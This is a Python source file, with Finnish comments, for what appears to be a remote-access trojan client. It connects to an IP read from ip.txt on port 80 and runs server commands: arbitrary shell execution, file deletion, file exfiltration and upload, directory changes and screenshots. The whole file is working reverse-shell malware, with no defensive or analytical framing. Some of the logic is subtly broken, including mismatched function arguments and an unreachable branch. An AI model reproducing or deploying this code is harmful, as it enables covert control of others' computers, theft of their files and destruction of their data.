import socket
import subprocess
import os
import pyautogui
import time

class MainClient:
    def __init__(self, ip:str, port:int):
        self.ip = ip
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.ip, self.port))
            
    def delete(self, s, command):
        s = self.s
        filename = command.split()[1]
        if os.path.exists(filename):
            os.remove(filename)
            s.send(b'file deleted')
        else:
            s.send(b'file not found')

    def upload(self, s, output_data):
        s = self.s
        self.size_of_data = str(len(output_data))
        s.send(bytes(self.size_of_data,'utf8'))
        time.sleep(2)
        s.send(bytes(output_data))

    def send_data(self, s, output_data):
        s = self.s
        self.size_of_data = str(len(output_data))
        s.send(bytes(self.size_of_data,'utf8'))
        time.sleep(2)
        s.send(output_data)

    def recv_data(self):
        s = self.s
        original_size = s.recv(2048).decode('utf-8')
        original_size = int(original_size)
        data = s.recv(2048)
        while len(data) != original_size:
            data = data + s.recv(2048)
        return data

    def change_dir(self, s,command):
        #splitataan välilyönneistä ja otetaan indeksi 1 talteen
        s = self.s
        try:
            path = command.split()[1]
            #jos polku löytyy vaihdetaan dirri käyttäen os modulin chdir functiota
            if os.path.exists(path):
                os.chdir(path)
                s.send(f'Directory changed to {os.getcwd()}'.encode())
            #jos ei löydy niin ilmoitetaan serverille
            else:
                s.send(b'Invalid directory name')
        except IndexError: # jos annettu cd.. linuxissa
            path = command.split()[0]
            if os.path.exists(path):
                os.chdir(path)
                s.send(f'Directory changed to {os.getcwd()}'.encode())
            else:
                s.send(b'Invalid command')

    def run_command(self, s, command):
        s = self.s
        # käytetään subprocessin run functiota. 
        # tarvitaan shelli sekä halutaan ottaa tulos talteen -> capture_output
        result = subprocess.run(command, shell=True, capture_output=True)
        # tulos on standard outputissa. virheet läytyvät result.stderrorista
        # eli jos oli virheellinen komento saadaan näytölle virheilmoitus eikä ohjelma kaadu
        if result.returncode == 0:
            s.send(result.stdout)
        else:
            s.send(b'Invalid command')

    def main(self):        
        s = self.s
        while True:
            #otetaan käsky talteen. 1kilotavu riittää. decodtaan bytet takaisin stringeiksi
            command = s.recv(4096).decode('ISO-8859-1')
            if command == 'exit':
                self.s.close()
                break
            elif command.startswith('cd') and len(command) > 3:
                self.change_dir(s,command)
            elif command.startswith('download'):
                self.upload(s,command)
            elif command == 'screen':
                screenshot = pyautogui.screenshot()
                screenshot.save("screenshot.png")
            elif command.startswith('del'):
                self.delete(s,command)
            # elif command.startswith('upload'):
            #     upload(s,command)
            #     continue
            elif command[:8] == 'download':
                try:
                    with open(command[9:], 'rb') as data:
                        data_read = data.read()
                except FileNotFoundError:
                    
                    self.send_data(b'not found')
                else:
                    self.send_data(data_read)
                    continue
            elif command[:6] == 'upload':
                data = self.recv_data()
                with open(command[7:], 'wb') as write_data:
                    write_data.write(data)
                    continue
            else:
                #ajetaan komento sekä lähetetään tulos serverille. 
                self.run_command(s,command)
                

if __name__ == '__main__':
    with open('ip.txt', 'r') as iipee:
        iipee = iipee.readline()

    appi = MainClient(iipee, 80)
    appi.main()